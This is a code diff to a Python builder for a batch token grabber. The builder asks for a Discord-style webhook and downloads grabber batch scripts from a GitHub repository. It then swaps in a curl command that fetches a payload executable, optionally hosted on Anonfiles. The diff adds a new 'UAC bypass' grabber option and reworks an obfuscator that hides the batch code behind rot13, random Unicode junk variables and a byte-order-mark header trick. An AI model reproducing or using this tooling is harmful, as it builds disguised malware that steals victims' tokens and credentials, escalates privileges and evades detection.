@@ -10,8 +10,8 @@ try:
 except ImportError:
     os.system("pip install colorama")
     import colorama
-else:
-    colorama.deinit()
+
+colorama.deinit()
 try:
     from pystyle import *
 except:
@@ -81,6 +81,7 @@ class builder:
         self.file = input("File name: ")
         self.obfuscate = True
         self.build_self = input("Would you like to bulid the exe that the grabber uses yourself? (y/n): ")
+        self.grabber_type = input("Would you like to use UAC bypass grabber (experimental) or normal grabber? (uac/n): ")
         if self.build_self == "y":
             self.anon = input("Would you like to use Anonfiles to host exe? (y/n): ")
         self.build()
@@ -124,7 +125,10 @@ class builder:
                 soup = bs(r.content, "html.parser")
                 link = soup.find("a", {"id": "download-url"}).get("href")
                 final = f"curl {link}"
-                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", final)
+                if self.grabber_type == "uac":
+                    grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber_with_uac_bypass.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", final)
+                elif self.grabber_type == "n":
+                    grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", final)
                 return grabber
             elif self.anon == "n":
                 direct_download = input("ENTIRE CURL LINK (not this can be curl YOUR_LINK or even curl -LJO YOUR_LINK THIS IS VERY ADVANCED SO DONT USE UNLESS YOU KNOW): ")
@@ -138,14 +142,20 @@ class builder:
                 shutil.move("dist/built.exe", "grabber.exe")
                 os.remove("built.py")
                 shutil.rmtree("dist")
-                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace(f"curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", f"{direct_download}")
+                if self.grabber_type == "uac":
+                    grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber_with_uac_bypass.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", direct_download)
+                elif self.grabber_type == "n":
+                    grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", direct_download)
                 return grabber
             else:
                 print("Invalid option dumbass")
                 builder()
 
         elif self.build_self == "n":
-            grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "")
+            if self.grabber_type == "uac":
+                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber_with_uac_bypass.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook)
+            elif self.grabber_type == "n":
+                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook)
             return grabber
         else:
             print(Colorate.Color(Colors.red, "Invalid option", False))
@@ -167,74 +177,104 @@ class builder:
 
     def obfuscate_real(self):
         try:
-            os.remove(f'{self.file}.obfuscated.bat')
-            os.remove(f'{self.file}.obfuscated.super.bat')
+            os.remove(f'{self.file}.bat.obfuscated.bat')
         except:
             pass
         switch = False
+        carrot = False
         with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
             ammount = len(original.readlines())
         with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
+            with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                f.write(code)
             for lines in tqdm(original, total=int(ammount), desc="Obfuscating", unit=" lines"):
                 label = lines.startswith(':')
                 if label == True:
                     with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                         f.write(lines) # TEMP FIX FOR NOT FINDING FUNCTIONS BATCH
+                    pass
                 else:
                     for char in lines:
-                        if switch == False:
-                            if '\n' in char:
-                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
-                                    f.write("\n")
-                            elif "%" in char:
-                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
-                                    f.write("%")
-                                    switch = True #thx baum for making this work :sob:
-                            else:
-                                random_num = randint(5, 12)
-                                random_string = ''.join(random.choice('⎛⎝⎞⎠⎬⎲⎳█▀▁▕﷽﷽﷽abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ𝘈Ḇ𝖢𝕯ḞԍНǏ𝙅ƘԸⲘ𝙉Ρ𝗤Ɍ𝓢ȚЦ𝒱Ѡ𝓧ƳȤѧᖯć𝗱ễ𝑓𝙜Ⴙ𝞲𝑗𝒌ļṃŉо𝞎𝒒ᵲꜱ𝙩ừ𝗏ŵ𝒙𝒚ź☞☟☠☡☢☣☤☥☦☧☰☱☲☳☴☵☶☷☸♕☻♡☹♆♔♅♖♘♗♙♚♛♜♝♞♟♠♡♢♣♤♥♦♧♨♩♪♫♬♭♮♯♰♱♲♳♴♵♶♶♸♹♻♼♽♾⚀⚁⚂⚃⚄⚅⚆⚇⚈⚉⚊⚋⚌⚍⚎⚏⚐⚑⚒⚔⚕⚖⚗⚘⚙⚚⚛⚜⚝⚞⚟﷽﷽﷽') for kdot in range(random_num))
-                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
-                                    if char in string.ascii_letters:
-                                        if char.islower():
-                                            coded0 = codecs.encode(char, 'rot_13')
-                                            coded = coded0.replace(coded0, f"%{coded0}%")
-                                            f.write(f"{coded}%{random_string}%")
-                                        else:
-                                            coded0 = codecs.encode(char, 'rot_13').upper()
-                                            coded = coded0.replace(coded0, f'%{coded0}1%')
-                                            f.write(f"{coded}%{random_string}%")
-                                    else:
-                                        f.write(f"{char}%{random_string}%")
+                        if char == '>':
+                            with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                f.write(char)
+                        elif carrot == True:
+                            carrot = False
+                            with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                f.write(char)
                         else:
-                            if "%" in char:
-                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
-                                    f.write("%")
-                                    switch = False
-                            elif '\n' in char:
-                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
-                                    f.write("\n")
+                            if switch == False:
+                                if '\n' in char:
+                                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                        f.write("\n")
+                                elif "%" in char:
+                                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                        f.write("%")
+                                        switch = True #thx baum for making this work :sob:
+                                else:
+                                    random_num = randint(5, 12)
+                                    random_string = ''.join(random.choice('𝘈Ḇ𝖢𝕯ḞԍНǏ𝙅ƘԸⲘ𝙉Ρ𝗤Ɍ𝓢ȚЦ𝒱Ѡ𝓧ƳȤѧᖯć𝗱ễ𝑓𝙜Ⴙ𝞲𝑗𝒌ļṃŉо𝞎𝒒ᵲꜱ𝙩ừ𝗏ŵ𝒙𝒚ź☞☟☠☡☢☣☤☥☦☧☰☱☲☳☴☵☶☷☸♕☻♡☹♆♔♅♖♘♗♙♚♛♜♝♞♟♠♡♢♣♤♥♦♧♨♩♪♫♬♭♮♯♰♱♲♳♴♵♶♶♸♹♻♼♽♾⚀⚁⚂⚃⚄⚅⚆⚇⚈⚉⚊⚋⚌⚍⚎⚏⚐⚑⚒⚔⚕⚖⚗⚘⚙⚚⚛⚜⚝⚞⚟') for kdot in range(random_num))
+                                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                        if char in string.ascii_letters:
+                                            if char.islower():
+                                                coded0 = codecs.encode(char, 'rot_13')
+                                                coded = coded0.replace(coded0, f"%{coded0}%")
+                                                f.write(f"{coded}%{random_string}%")
+                                            else:
+                                                coded0 = codecs.encode(char, 'rot_13').upper()
+                                                coded = coded0.replace(coded0, f'%{coded0}1%')
+                                                f.write(f"{coded}%{random_string}%")
+                                        else:
+                                            f.write(f"{char}%{random_string}%")
                             else:
-                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
-                                    f.write(char) # spent like 2 hours trying to fix this and found baums again :sob: https://github.com/baum1810/batchobfuscator
+                                if "%" in char:
+                                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                        f.write("%")
+                                        switch = False
+                                elif '\n' in char:
+                                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                        f.write("\n")
+                                else:
+                                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
+                                        f.write(char) # spent like 2 hours trying to fix this and found baums again :sob: https://github.com/baum1810/batchobfuscator
 
+        with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
+            all_stuff = f.read()
+        new_stuff = all_stuff.replace("%~f0%", "%~f0")
+        new_stuff = new_stuff.replace("%~dp0%", "%~dp0")
+        new_stuff = new_stuff.replace("%~dpn0%", "%~dpn0")
+        #I just did most common ones. If you want more, just add them here.
+        with open(f'{self.file}.bat.obfuscated.bat', 'w', encoding='utf-8') as f:
+            f.write(new_stuff)
+
+        if self.grabber_type == "uac":
             with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
-                everything = f.read()
-            with open(f'{self.file}.bat.obfuscated.bat', 'w+', encoding='utf-8') as f:
-                f.write(f"{code}\n{everything}")
+                data = f.readlines()
 
-            out_hex = []
+        elif self.grabber_type == "n":
+            print("No modifications needed for non-uac grabber")
+        else:
+            print(Colorate.Color(Colors.red, "Invalid option", False))
+            builder()
 
-            out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
-            with open(f'{self.file}.bat.obfuscated.bat','rb') as f:
-                    penis = f.read()
+        with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
+            everything = f.read()
+        with open(f'{self.file}.bat.obfuscated.bat', 'w+', encoding='utf-8') as f:
+            f.write(f"{code}\n{everything}")
 
-            out_hex.extend(['{:02X}'.format(b) for b in penis])
+        out_hex = []
 
-            with open(f'{self.file}.bat.obfuscated.super.bat', 'wb') as f:
-                for i in out_hex:
-                    f.write(bytes.fromhex(i))
+        out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
+        with open(f'{self.file}.bat.obfuscated.bat','rb') as f:
+                penis = f.read()
 
-            print(Colorate.Color(Colors.green, "Done!", True))
+        out_hex.extend(['{:02X}'.format(b) for b in penis])
+
+        with open(f'{self.file}.bat.obfuscated.super.bat', 'wb') as f:
+            for i in out_hex:
+                f.write(bytes.fromhex(i))
+
+        print(Colorate.Color(Colors.green, "Done!", True))
 
 
 if __name__ == '__main__':
